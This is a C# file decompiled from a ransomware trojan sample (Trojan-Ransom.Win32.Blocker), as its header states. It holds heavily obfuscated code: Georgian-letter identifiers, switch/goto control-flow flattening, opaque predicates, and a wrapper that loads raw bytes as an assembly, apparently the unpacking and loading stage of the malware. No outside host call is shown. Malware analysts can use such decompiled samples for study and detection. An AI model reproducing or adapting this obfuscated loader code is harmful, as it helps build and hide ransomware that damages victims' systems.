// Decompiled with JetBrains decompiler
// Type: Ⴀ.ႷႳ
// Assembly: Serveraaaaaaaaaa - Copy, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 483B0CF7-61E9-42BD-9FF5-AC08E5071AD6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.ywq-f0c1edcaf904f617f812074291e4e04a6ca89f2f4fc34f4b39c6e091310a9588.exe

using Evaluation;
using System;
using System.IO.Packaging;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;

namespace Ⴀ
{
  internal sealed class ႷႳ
  {
    [SecuritySafeCritical]
    static ႷႳ() => Ⴀ.ႷႷ.ႭႳ.ႤႼ();

    internal static long Ⴄ()
    {
      byte[] ⴈ = ႷႭ.Ⴈ;
label_3:
      int num1 = 892;
label_4:
      int num2 = 315;
label_5:
      int num3 = 446 < num1 / 2 - num2 ? 6 : 1;
      while (true)
      {
        switch (num3)
        {
          case 0:
            goto label_3;
          case 1:
            ႷႳ.Ⴄ();
            int num4 = (int) ⴈ[28];
            BabelAttribute.Ⴐ[88] = ႷႭ.Ⴈ[177];
            num3 = num4 - 114;
            continue;
          case 4:
            goto label_4;
          case 5:
            goto label_5;
          case 6:
            goto label_7;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႳ.Ⴄ);
            num3 = 0;
            continue;
        }
      }
label_7:
      return 4;
    }

    [SecuritySafeCritical]
    internal static int Ⴈ()
    {
label_3:
      Ⴀ.ႷႷ.ႭႳ.ႭႨ.Ⴀ(953, 1011).SetData(Ⴀ.ႷႷ.ႭႳ.ႭႭ.Ⴓ(602520315, typeof (ႷႥ), 8), (object) null);
label_4:
      int num = 3;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 4:
            goto label_3;
          case 2:
            goto label_4;
          case 3:
            goto label_5;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႳ.Ⴈ);
            num = 4;
            continue;
        }
      }
label_5:
      BabelAttribute.Ⴐ[270] = (byte) ((int) BabelAttribute.Ⴐ[270] & (int) BabelAttribute.Ⴐ[56] & 242);
      return 9;
    }

    internal static long Ⴓ()
    {
      byte[] ⴐ = BabelAttribute.Ⴐ;
label_3:
      int num1 = 1506;
label_4:
      int num2 = 467;
label_5:
      int num3 = 753 < num1 / 2 - num2 ? (int) ⴐ[213] - 237 : 3;
      while (true)
      {
        switch (num3)
        {
          case 0:
            goto label_5;
          case 2:
          case 5:
            goto label_7;
          case 3:
            ႷႳ.Ⴓ();
            num3 = 2;
            continue;
          case 4:
            goto label_3;
          case 6:
            goto label_4;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႳ.Ⴓ);
            num3 = 4;
            continue;
        }
      }
label_7:
      return 13;
    }

    [SecuritySafeCritical]
    internal static Type Ⴅ()
    {
      byte[] ⴐ = BabelAttribute.Ⴐ;
      byte[] ⴈ = ႷႭ.Ⴈ;
label_3:
      int index = 0;
      Array array = (Array) Ⴀ.ႷႷ.ႭႳ.ႭႭ.ႤႰ(Ⴀ.ႷႷ.ႭႳ.ႭႨ.Ⴀ(613, 558), Ⴀ.ႷႷ.ႭႳ.ႭႭ.Ⴓ(602520310, typeof (BabelAttribute), 5), 'Ϛ', 951);
      int num1 = 7;
      while (true)
      {
        switch (num1)
        {
          case 0:
            ++index;
            num1 = (int) ⴐ[91] - 219;
            continue;
          case 1:
          case 7:
            num1 = ((byte[]) array)[index] < (byte) 8 ? 9 : 13;
            continue;
          case 2:
            ႷႳ.Ⴄ();
            num1 = (int) ⴐ[238];
            continue;
          case 4:
          case 14:
            goto label_13;
          case 5:
            goto label_9;
          case 6:
            num1 = (byte) 207 == ((byte[]) array)[index] ? (int) ⴈ[187] - 123 : (int) ⴐ[47] - 63;
            continue;
          case 8:
            num1 = ((byte[]) array)[index] < (byte) 207 ? (int) ⴐ[130] : 6;
            continue;
          case 9:
            goto label_4;
          case 10:
            goto label_12;
          case 11:
            goto label_3;
          case 13:
            num1 = (byte) 8 == ((byte[]) array)[index] ? 0 : 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႳ.Ⴅ);
            num1 = (int) ⴐ[14] / 8;
            continue;
        }
      }
label_4:
      return typeof (DeepSeaObfuscator);
label_9:
      return typeof (ႷႣ);
label_12:
      Ⴀ.ႷႷ.Ⴅ();
label_13:
      int num2 = index + 1;
      return typeof (ႷႭ);
    }

    [SecuritySafeCritical]
    internal static void Ⴐ()
    {
      byte[] ⴈ = ႷႭ.Ⴈ;
      byte[] ⴐ = BabelAttribute.Ⴐ;
      int index;
      switch (2)
      {
        case 0:
          object obj = (object) (byte[]) Ⴀ.ႷႷ.ႭႳ.ႭႭ.ႤႰ(Ⴀ.ႷႷ.ႭႳ.ႭႨ.Ⴀ(943, 995), Ⴀ.ႷႷ.ႭႳ.ႭႭ.Ⴓ(602520308, typeof (ႷႳ), 7), 'ǘ', 438);
label_6:
          while (((byte[]) obj)[index] >= (byte) 8)
          {
            int num1 = (int) ⴈ[54];
            while (true)
            {
              switch (num1)
              {
                case 0:
                case 30:
                  Ⴀ.ႷႷ.Ⴅ();
                  goto case 9;
                case 1:
                  num1 = (byte) 207 == ((byte[]) obj)[index] ? 8 : (int) ⴐ[186] - 57;
                  continue;
                case 2:
                  Ⴀ.ႷႷ.ႭႳ.Ⴃ();
                  goto case 11;
                case 3:
                  int num2 = (int) (obj as byte[])[index];
                  ႷႭ.Ⴈ[181] = (byte) (((int) ႷႭ.Ⴈ[181] | (int) ႷႭ.Ⴈ[151]) & 100);
                  num1 = 173 == num2 ? 9 : (int) ⴈ[139] - 216;
                  continue;
                case 4:
                  goto label_34;
                case 5:
                  Ⴀ.ႷႷ.ႭႳ.Ⴅ();
                  num1 = (int) ⴈ[183] - (int) ⴈ[37];
                  continue;
                case 6:
                  num1 = (byte) 32 == (obj as byte[])[index] ? (int) ⴈ[9] - 75 : (int) ⴈ[211] - 151;
                  continue;
                case 7:
                  num1 = (obj as byte[])[index] < (byte) 173 ? 23 : (int) ⴈ[146] - 96;
                  continue;
                case 8:
                  ++index;
                  num1 = 7;
                  continue;
                case 9:
                case 32:
                  ++index;
                  goto case 24;
                case 10:
                  int num3 = (int) Ⴀ.ႷႷ.ႭႳ.ႭႭ.Ⴃ();
                  num1 = (int) ⴐ[221] - (int) ⴐ[180];
                  continue;
                case 11:
                  ++index;
                  num1 = (int) ⴐ[63] - 239;
                  continue;
                case 12:
                  num1 = ((byte[]) obj)[index] < (byte) 167 ? (int) ⴐ[147] : (int) ⴐ[122] - 198;
                  continue;
                case 13:
                  ++index;
                  num1 = 25;
                  continue;
                case 14:
                  goto label_16;
                case 15:
                  num1 = ((byte[]) obj)[index] < (byte) 207 ? 18 : 1;
                  continue;
                case 16:
                  num1 = (byte) 8 == (obj as byte[])[index] ? (int) ⴈ[206] - 66 : (int) ⴈ[219] - 184;
                  continue;
                case 17:
                  num1 = (byte) 167 == ((byte[]) obj)[index] ? (int) ⴈ[101] - 70 : (int) ⴐ[130];
                  continue;
                case 18:
                  goto label_3;
                case 19:
                  goto label_35;
                case 20:
                  goto label_27;
                case 22:
                  num1 = ((byte[]) obj)[index] < (byte) 229 ? (int) ⴈ[28] - 106 : 27;
                  continue;
                case 23:
                  goto label_11;
                case 24:
                  num1 = 22;
                  continue;
                case 25:
                  num1 = ((byte[]) obj)[index] < (byte) 32 ? (int) ⴈ[83] - 61 : 6;
                  continue;
                case 26:
                  Ⴀ.ႷႷ.ႭႳ.Ⴍ();
                  num1 = (int) ⴈ[218] - 52;
                  continue;
                case 27:
                  num1 = (byte) 229 == ((byte[]) obj)[index] ? (int) ⴐ[86] - 159 : (int) ⴐ[99] - 92;
                  continue;
                case 28:
                  goto label_6;
                case 29:
                  ++index;
                  num1 = (int) ⴈ[191] - (int) ⴈ[210];
                  continue;
                case 31:
                  goto label_22;
                default:
                  goto label_5;
              }
            }
label_16:
            break;
label_3:
            break;
label_27:
            break;
label_11:
            break;
label_22:
            break;
label_5:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႳ.Ⴐ);
            break;
label_34:
            Ⴀ.ႷႷ.ႭႳ.Ⴃ();
label_35:
            int num4 = index + 1;
            break;
          }
          break;
        case 3:
          break;
        case 4:
          break;
        default:
          index = 0;
          goto case 0;
      }
    }

    [SecuritySafeCritical]
    internal static string Ⴀ()
    {
      byte[] ⴈ = ႷႭ.Ⴈ;
      byte[] ⴐ = BabelAttribute.Ⴐ;
label_3:
      int index = 0;
      object obj = (object) (byte[]) Ⴀ.ႷႷ.ႭႳ.ႭႭ.ႤႰ(Ⴀ.ႷႷ.ႭႳ.ႭႨ.Ⴀ(23, 90), Ⴀ.ႷႷ.ႭႳ.ႭႭ.Ⴓ(602520305, typeof (Ⴀ.ႷႷ), 2), 'Ϝ', 947);
      int num1 = 1;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 18:
            ++index;
            num1 = 6;
            continue;
          case 1:
            num1 = ((byte[]) obj)[index] < (byte) 8 ? (int) ⴐ[139] - 72 : (int) ⴈ[177] - 102;
            continue;
          case 3:
            num1 = (byte) 207 == ((byte[]) obj)[index] ? (int) ⴐ[202] - 100 : (int) ⴈ[156];
            continue;
          case 4:
            ++index;
            num1 = (int) ⴐ[193] - 218;
            continue;
          case 5:
          case 15:
            goto label_9;
          case 6:
            num1 = ((byte[]) obj)[index] < (byte) 207 ? 5 : (int) ⴐ[126] - 84;
            continue;
          case 7:
            ႷႳ.Ⴈ();
            num1 = 13;
            continue;
          case 8:
            Ⴀ.ႷႷ.ႭႳ.Ⴃ();
            goto case 0;
          case 9:
            num1 = (byte) 8 == (obj as byte[])[index] ? 0 : (int) ⴐ[70] - 208;
            continue;
          case 10:
            goto label_14;
          case 11:
          case 12:
            ႷႳ.Ⴓ();
            num1 = (int) ⴐ[95] - 240;
            continue;
          case 13:
            goto label_18;
          case 14:
            goto label_4;
          case 16:
            num1 = (byte) 173 == ((byte[]) obj)[index] ? 13 : 7;
            continue;
          case 17:
            goto label_3;
          case 19:
            num1 = (obj as byte[])[index] < (byte) 173 ? 10 : 16;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႳ.Ⴀ);
            num1 = 17;
            continue;
        }
      }
label_4:
      return (string) null;
label_9:
      return (string) null;
label_14:
      return (string) null;
label_18:
      int num2 = index + 1;
      return (string) null;
    }

    [SecuritySafeCritical]
    internal static void Ⴍ()
    {
      byte[] ⴐ = BabelAttribute.Ⴐ;
      byte[] ⴈ = ႷႭ.Ⴈ;
      int index;
      switch (4)
      {
        case 0:
          break;
        case 1:
          break;
        case 2:
          Array array = (Array) Ⴀ.ႷႷ.ႭႳ.ႭႭ.ႤႰ(Ⴀ.ႷႷ.ႭႳ.ႭႨ.Ⴀ(877, 803), Ⴀ.ႷႷ.ႭႳ.ႭႭ.Ⴓ(602520305, typeof (Ⴀ.ႷႷ), 2), '\u0092', 226);
label_6:
          while ((array as byte[])[index] >= (byte) 8)
          {
            int num1 = 5;
            while (true)
            {
              switch (num1)
              {
                case 0:
                case 8:
                  ++index;
                  num1 = 33;
                  continue;
                case 1:
                  goto label_31;
                case 2:
                  ++index;
                  num1 = (int) ⴐ[247];
                  continue;
                case 3:
                case 34:
                  num1 = (array as byte[])[index] < (byte) 229 ? 30 : 21;
                  continue;
                case 4:
                  ++index;
                  num1 = (int) ⴐ[217];
                  continue;
                case 5:
                  num1 = (byte) 8 == ((byte[]) array)[index] ? 38 : 10;
                  continue;
                case 6:
                  goto label_21;
                case 7:
                  num1 = (byte) 173 == (array as byte[])[index] ? (int) ⴐ[44] - 168 : 41;
                  continue;
                case 9:
                  goto label_44;
                case 10:
                  Ⴀ.ႷႷ.ႭႳ.Ⴈ();
                  num1 = (int) ⴐ[8] / 6;
                  continue;
                case 11:
                  goto label_6;
                case 12:
                  num1 = (byte) 207 == (array as byte[])[index] ? 2 : 36;
                  continue;
                case 13:
                  Ⴀ.ႷႷ.ႭႳ.ႭႭ.Ⴗ();
                  num1 = 14;
                  continue;
                case 14:
                  ++index;
                  num1 = 20;
                  continue;
                case 15:
                  num1 = ((byte[]) array)[index] < (byte) 207 ? (int) ⴈ[173] - 203 : 12;
                  continue;
                case 16:
                  goto label_3;
                case 17:
                case 27:
                  num1 = (byte) 167 == ((byte[]) array)[index] ? (int) ⴐ[130] + 9 : 13;
                  continue;
                case 18:
                  ႷႳ.Ⴓ();
                  num1 = 40;
                  continue;
                case 19:
                  num1 = (array as byte[])[index] < (byte) 213 ? 1 : (int) ⴐ[142];
                  continue;
                case 20:
                  num1 = (array as byte[])[index] < (byte) 32 ? 28 : 29;
                  continue;
                case 21:
                  num1 = (byte) 229 == ((byte[]) array)[index] ? 0 : 23;
                  continue;
                case 22:
                  Ⴀ.ႷႷ.ႭႳ.Ⴀ();
                  num1 = (int) ⴐ[227] - 167;
                  continue;
                case 23:
                  ႷႳ.Ⴈ();
                  num1 = (int) ⴈ[83] - 81;
                  continue;
                case 24:
                  goto label_11;
                case 25:
                  num1 = ((byte[]) array)[index] < (byte) 18 ? (int) ⴐ[0] : 31;
                  continue;
                case 26:
                  num1 = ((byte[]) array)[index] < (byte) 173 ? 24 : 7;
                  continue;
                case 28:
                  goto label_26;
                case 29:
                  num1 = (byte) 32 == (array as byte[])[index] ? (int) ⴈ[38] - (int) ⴈ[213] : (int) ⴐ[134] - 88;
                  continue;
                case 30:
                  goto label_16;
                case 31:
                  num1 = (byte) 18 == (array as byte[])[index] ? 9 : 22;
                  continue;
                case 33:
                  num1 = ((byte[]) array)[index] < (byte) 167 ? 6 : (int) ⴈ[136];
                  continue;
                case 35:
                  num1 = (byte) 213 == ((byte[]) array)[index] ? (int) ⴈ[49] : 37;
                  continue;
                case 36:
                  Ⴀ.ႷႷ.ႭႳ.Ⴐ();
                  num1 = (int) ⴐ[75] - 40;
                  continue;
                case 37:
                  ႷႳ.Ⴈ();
                  num1 = (int) ⴈ[49];
                  continue;
                case 38:
                  ++index;
                  num1 = 15;
                  continue;
                case 39:
                  ++index;
                  num1 = 25;
                  continue;
                case 40:
                  ++index;
                  num1 = (int) ⴈ[163] - 58;
                  continue;
                case 41:
                  ႷႳ.Ⴓ();
                  num1 = 4;
                  continue;
                case 42:
                  goto label_36;
                default:
                  goto label_5;
              }
            }
label_31:
            break;
label_21:
            break;
label_3:
            break;
label_11:
            break;
label_26:
            break;
label_16:
            break;
label_36:
            break;
label_5:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႳ.Ⴍ);
            break;
label_44:
            int num2 = index + 1;
            break;
          }
          break;
        case 3:
          break;
        default:
          index = 0;
          goto case 2;
      }
    }

    [SecuritySafeCritical]
    internal static int Ⴃ()
    {
      byte[] ⴈ = ႷႭ.Ⴈ;
      byte[] ⴐ = BabelAttribute.Ⴐ;
label_3:
      int index = 0;
      object obj = (object) (byte[]) Ⴀ.ႷႷ.ႭႳ.ႭႭ.ႤႰ(Ⴀ.ႷႷ.ႭႳ.ႭႨ.Ⴀ(427, 484), Ⴀ.ႷႷ.ႭႳ.ႭႭ.Ⴓ(602520310, typeof (ႷႭ), 5), '˗', 678);
      int num1 = (int) ⴐ[77] - 79;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 13:
            int num2;
            if ((byte) 207 != ((byte[]) obj)[index])
              num2 = (int) ⴈ[210] - 180;
            else
              goto label_15;
label_14:
            num1 = num2;
            continue;
label_15:
            int num3 = (int) ⴈ[18];
            int num4 = (int) ⴈ[78];
            BabelAttribute.Ⴐ[64] = (byte) ((int) BabelAttribute.Ⴐ[64] * (int) BabelAttribute.Ⴐ[9] & 64);
            num2 = num3 - num4;
            goto label_14;
          case 1:
          case 12:
            num1 = (byte) 8 == ((byte[]) obj)[index] ? 8 : (int) ⴈ[62] - (int) ⴈ[20];
            continue;
          case 2:
            goto label_3;
          case 4:
            goto label_4;
          case 5:
            goto label_17;
          case 6:
            goto label_10;
          case 7:
            num1 = (obj as byte[])[index] < (byte) 8 ? 4 : 1;
            continue;
          case 8:
            ++index;
            goto case 10;
          case 9:
            Ⴀ.ႷႷ.ႭႳ.Ⴃ();
            goto case 8;
          case 10:
            num1 = 11;
            continue;
          case 11:
            num1 = (obj as byte[])[index] < (byte) 207 ? 6 : (int) ⴐ[186] - 54;
            continue;
          case 14:
            goto label_16;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႳ.Ⴃ);
            num1 = (int) ⴈ[107] - 29;
            continue;
        }
      }
label_4:
      return 2;
label_10:
      return 6;
label_16:
      Ⴀ.ႷႷ.Ⴅ();
label_17:
      int num5 = index + 1;
      return 7;
    }

    [SecuritySafeCritical]
    internal static Type Ⴜ()
    {
      byte[] ⴈ = ႷႭ.Ⴈ;
      byte[] ⴐ = BabelAttribute.Ⴐ;
label_3:
      int index = 0;
      Array array = (Array) Ⴀ.ႷႷ.ႭႳ.ႭႭ.ႤႰ(Ⴀ.ႷႷ.ႭႳ.ႭႨ.Ⴀ(753, 673), Ⴀ.ႷႷ.ႭႳ.ႭႭ.Ⴓ(602520309, typeof (ႷႭ), 6), 'ʻ', 713);
      int num1 = (int) ⴈ[38] - 201;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_4;
          case 1:
          case 6:
            Ⴀ.ႷႷ.Ⴅ();
            goto case 10;
          case 2:
            Ⴀ.ႷႷ.ႭႳ.Ⴃ();
            goto case 16;
          case 3:
            num1 = (byte) 8 == ((byte[]) array)[index] ? (int) ⴈ[89] - 103 : 2;
            continue;
          case 5:
            Ⴀ.ႷႷ.ႭႳ.Ⴀ();
            num1 = 9;
            continue;
          case 7:
          case 17:
            num1 = ((byte[]) array)[index] < (byte) 8 ? 0 : (int) ⴈ[132] - 146;
            continue;
          case 8:
            goto label_9;
          case 9:
            goto label_18;
          case 10:
            ++index;
            num1 = 15;
            continue;
          case 11:
            num1 = (byte) 173 == (array as byte[])[index] ? (int) ⴐ[100] - 30 : (int) ⴐ[130];
            continue;
          case 12:
            num1 = (array as byte[])[index] < (byte) 207 ? 8 : 19;
            continue;
          case 13:
            goto label_19;
          case 14:
            goto label_3;
          case 15:
            num1 = (array as byte[])[index] < (byte) 173 ? 18 : (int) ⴐ[160] - 25;
            continue;
          case 16:
            ++index;
            num1 = (int) ⴐ[116] / 7;
            continue;
          case 18:
            goto label_14;
          case 19:
            num1 = (byte) 207 == (array as byte[])[index] ? 10 : 1;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႳ.Ⴜ);
            num1 = 14;
            continue;
        }
      }
label_4:
      return typeof (ႷႭ);
label_9:
      return typeof (Ⴀ.ႷႷ.ႭႥ);
label_14:
      return typeof (ႷႭ);
label_18:
      int num2 = index + 1;
label_19:
      return typeof (\u003CModule\u003E);
    }

    [SecuritySafeCritical]
    internal static void ႨႤ()
    {
      byte[] ⴈ = ႷႭ.Ⴈ;
      byte[] ⴐ = BabelAttribute.Ⴐ;
      int index;
      object obj;
      switch (4)
      {
        case 0:
label_6:
          while (((byte[]) obj)[index] >= (byte) 8)
          {
            int num1 = 4;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  ႷႳ.Ⴄ();
                  num1 = (int) ⴐ[72] - 160;
                  continue;
                case 1:
                  ++index;
                  num1 = (int) ⴈ[15] - 201;
                  continue;
                case 2:
                  goto label_16;
                case 3:
                  num1 = ((byte[]) obj)[index] < (byte) 229 ? 2 : (int) ⴐ[130];
                  continue;
                case 4:
                  num1 = (byte) 8 == ((byte[]) obj)[index] ? (int) ⴈ[54] : 18;
                  continue;
                case 5:
                  num1 = (byte) 229 == ((byte[]) obj)[index] ? 9 : 14;
                  continue;
                case 7:
                  goto label_11;
                case 9:
                  goto label_24;
                case 10:
                case 22:
                  num1 = (obj as byte[])[index] < (byte) 207 ? 20 : (int) ⴈ[66];
                  continue;
                case 11:
                case 12:
                  num1 = (obj as byte[])[index] < (byte) 173 ? 7 : 15;
                  continue;
                case 13:
                  ++index;
                  num1 = 12;
                  continue;
                case 14:
                  Ⴀ.ႷႷ.ႭႳ.ႭႭ.Ⴗ();
                  num1 = (int) ⴈ[34] - (int) ⴈ[78];
                  continue;
                case 15:
                  num1 = (byte) 173 == (obj as byte[])[index] ? 1 : 0;
                  continue;
                case 16:
                  ++index;
                  num1 = 10;
                  continue;
                case 17:
                  Ⴀ.ႷႷ.Ⴅ();
                  goto case 13;
                case 18:
                  int num2 = (int) Ⴀ.ႷႷ.ႭႳ.ႭႭ.Ⴃ();
                  num1 = (int) ⴈ[12] - 171;
                  continue;
                case 19:
                  goto label_6;
                case 20:
                  goto label_3;
                case 21:
                  num1 = (byte) 207 == ((byte[]) obj)[index] ? 13 : 17;
                  continue;
                default:
                  goto label_5;
              }
            }
label_16:
            break;
label_11:
            break;
label_3:
            break;
label_5:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႳ.ႨႤ);
            break;
label_24:
            int num3 = index + 1;
            break;
          }
          break;
        case 1:
          break;
        case 3:
          break;
        default:
          index = 0;
          obj = (object) (byte[]) Ⴀ.ႷႷ.ႭႳ.ႭႭ.ႤႰ(Ⴀ.ႷႷ.ႭႳ.ႭႨ.Ⴀ(214, 135), Ⴀ.ႷႷ.ႭႳ.ႭႭ.Ⴓ(602520309, typeof (BabelAttribute), 6), '/', 92);
          goto case 0;
      }
    }

    [SecuritySafeCritical]
    internal static DateTime Ⴗ([In] int obj0, [In] char obj1)
    {
      byte[] ⴐ = BabelAttribute.Ⴐ;
      byte[] ⴈ = ႷႭ.Ⴈ;
label_3:
      int num1 = 0;
      int num2 = 1;
      DateTime now;
      int num3;
      int num4;
      while (true)
      {
        switch (num2)
        {
          case 1:
            now = DateTime.Now;
            int num5 = num1;
            ႷႭ.Ⴈ[194] = (byte) ((int) ႷႭ.Ⴈ[194] - obj0 & 48);
            num1 = num5 + 1;
            num3 = 548;
            goto case 4;
          case 2:
          case 3:
            goto label_3;
          case 4:
            num2 = 6;
            continue;
          case 5:
            num2 = 137 < num3 / 4 - num4 ? (int) ⴈ[150] - 211 : (int) ⴐ[58] - 173;
            continue;
          case 6:
            num4 = 105;
            goto case 5;
          case 7:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႳ.Ⴗ);
            num2 = 3;
            continue;
        }
      }
label_8:
      return now;
    }

    [SecuritySafeCritical]
    internal static Assembly ႷႨ([In] int obj0, [In] char obj1)
    {
      byte[] ⴈ = ႷႭ.Ⴈ;
label_3:
      int num1 = 0;
      int num2 = 10;
      object obj;
      while (true)
      {
        switch (num2)
        {
          case 0:
            obj = (object) Assembly.GetExecutingAssembly();
            num2 = (int) ⴈ[227] - 36;
            continue;
          case 1:
            num2 = 10;
            continue;
          case 2:
          case 11:
            obj = (object) Assembly.GetExecutingAssembly();
            num2 = 9;
            continue;
          case 3:
            goto label_3;
          case 4:
            goto label_14;
          case 5:
          case 10:
            int num3;
            switch ((obj0 ^ (int) obj1) - 9 ^ num1)
            {
              case 0:
                num3 = (int) ⴈ[15] - (int) ⴈ[15];
                break;
              case 1:
                num3 = 11;
                break;
              default:
                num3 = 7;
                break;
            }
            num2 = num3;
            continue;
          case 6:
          case 7:
            obj = (object) null;
            num2 = 9;
            continue;
          case 9:
            ++num1;
            int num4 = (int) obj1;
            num2 = (num4 * num4 + (int) obj1) % 2 == 0 ? 4 : 1;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႳ.ႷႨ);
            num2 = 3;
            continue;
        }
      }
label_14:
      return (Assembly) obj;
    }

    [SecuritySafeCritical]
    internal static int ႷႷ([In] string obj0, [In] int obj1, [In] short obj2)
    {
      byte[] ⴈ = ႷႭ.Ⴈ;
      byte[] ⴐ = BabelAttribute.Ⴐ;
label_3:
      int num1 = 0;
      int num2 = 1;
      int length;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num3 = (int) obj2 + num3;
            goto case 5;
          case 1:
          case 7:
            length = obj0.Length;
            ++num1;
            int num4 = (int) obj2;
            num3 = num4 * num4;
            num2 = (int) ⴈ[145] - 226;
            continue;
          case 3:
          case 4:
            goto label_7;
          case 5:
            int num5 = num3 % 2;
            ႷႭ.Ⴈ[208] = (byte) ((int) ႷႭ.Ⴈ[208] + obj1 & 166);
            num2 = num5 != 0 ? 1 : (int) ⴐ[160] / 9;
            continue;
          case 6:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႳ.ႷႷ);
            num2 = 6;
            continue;
        }
      }
label_7:
      return length;
    }

    [SecuritySafeCritical]
    internal static char[] ႷႰ([In] string obj0, [In] int obj1, [In] char obj2)
    {
      byte[] ⴈ = ႷႭ.Ⴈ;
      byte[] ⴐ = BabelAttribute.Ⴐ;
label_3:
      int num1 = 0;
      int num2 = (int) ⴈ[71];
      Array charArray;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 7:
            int num3 = (int) obj2;
            num2 = (num3 * num3 + (int) obj2) % 2 == 0 ? 2 : (int) ⴐ[217];
            continue;
          case 2:
          case 6:
            goto label_7;
          case 3:
            num2 = (int) ⴈ[71];
            continue;
          case 4:
            goto label_3;
          case 5:
            charArray = (Array) obj0.ToCharArray();
            ++num1;
            goto case 1;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႳ.ႷႰ);
            num2 = 4;
            continue;
        }
      }
label_7:
      return charArray as char[];
    }

    [SecuritySafeCritical]
    internal static PackagePart ႷႤ([In] Package obj0, [In] Uri obj1, [In] char obj2, [In] char obj3)
    {
      byte[] ⴐ = BabelAttribute.Ⴐ;
label_3:
      int num1 = 0;
      int num2 = 3;
      object part;
      while (true)
      {
        switch (num2)
        {
          case 0:
            ++num1;
            num2 = (int) ⴐ[130];
            continue;
          case 1:
          case 7:
            goto label_7;
          case 2:
          case 6:
            goto label_3;
          case 3:
            part = (object) obj0.GetPart(obj1);
            goto case 0;
          case 5:
            int num3 = (int) obj3;
            int num4 = num3 * num3;
            int num5 = (int) obj3 + num4;
            BabelAttribute.Ⴐ[197] = (byte) (((int) BabelAttribute.Ⴐ[197] ^ (int) BabelAttribute.Ⴐ[67]) & 233);
            num2 = num5 % 2 != 0 ? 3 : 1;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႳ.ႷႤ);
            num2 = 2;
            continue;
        }
      }
label_7:
      return (PackagePart) part;
    }

    [SecuritySafeCritical]
    internal static Assembly ႷႠ([In] byte[] obj0, [In] char obj1, [In] short obj2)
    {
      byte[] ⴈ = ႷႭ.Ⴈ;
      byte[] ⴐ = BabelAttribute.Ⴐ;
label_3:
      int num1 = 0;
      int num2 = (int) ⴈ[83] - (int) ⴈ[83];
      ICustomAttributeProvider attributeProvider;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 6:
            attributeProvider = (ICustomAttributeProvider) Assembly.Load(obj0);
            ++num1;
            num3 = 437;
            goto case 8;
          case 1:
          case 4:
            goto label_3;
          case 2:
            num2 = 7560 > 840 - num3 * 9 ? 3 : 7;
            continue;
          case 3:
            goto label_8;
          case 7:
            num2 = (int) ⴐ[238];
            continue;
          case 8:
            num2 = (int) ⴐ[43] - 114;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႳ.ႷႠ);
            num2 = 4;
            continue;
        }
      }
label_8:
      return attributeProvider as Assembly;
    }
  }
}
